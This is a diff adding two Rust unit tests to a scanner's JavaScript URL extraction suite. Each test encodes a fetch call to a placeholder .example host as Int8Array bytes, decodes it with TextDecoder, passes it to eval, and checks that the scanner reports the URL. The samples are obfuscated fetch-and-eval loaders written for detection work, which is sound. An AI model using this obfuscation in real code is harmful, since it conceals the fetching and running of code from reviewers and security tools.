@@ -14279,6 +14279,58 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_bound_int8array_of_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-int8array-of-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = Int8Array.of({bytes}); eval(new TextDecoder().decode(a))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-of-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Int8Array.of payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_int8array_from_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-int8array-from-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = Int8Array.from([{bytes}]); eval(new TextDecoder().decode(a))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-from-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Int8Array.from payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_regex_whitespace_replace_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
